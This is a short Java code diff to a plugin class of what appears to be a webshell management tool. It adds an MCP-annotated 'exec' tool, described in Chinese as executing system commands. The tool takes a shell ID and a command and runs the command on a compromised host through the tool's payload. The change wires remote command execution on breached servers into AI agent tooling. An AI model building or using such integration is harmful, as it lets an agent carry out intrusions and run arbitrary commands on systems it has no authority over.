@@ -40,6 +40,9 @@ import sun.misc.BASE64Decoder;
 import util.UiFunction;
 import util.automaticBindClick;
 import util.functions;
+import core.annotation.McpTool;
+import core.annotation.McpParam;
+import java.util.Map;
 
 public abstract class NewCmd implements Plugin {
     protected Payload payload;
@@ -887,6 +890,16 @@ public abstract class NewCmd implements Plugin {
     public static String getUUID32() {
         String uuid = UUID.randomUUID().toString().replace("-", "").toLowerCase();
         return uuid;
+    }
+
+    @McpTool(name = "exec", desc = "执行系统命令 (NewCmd 命令执行)", params = {
+            @McpParam(name = "shellId", required = true, desc = "Shell ID"),
+            @McpParam(name = "command", required = true, desc = "要执行的命令") })
+    public String mcpExec(Map<String, Object> args) {
+        String cmd = (String) args.get("command");
+        if (cmd == null || cmd.trim().isEmpty()) return "缺少参数: command";
+        if (this.payload == null) return "payload 未初始化";
+        return this.payload.execCommand(cmd);
     }
 
     public void init(ShellEntity shellEntity) {
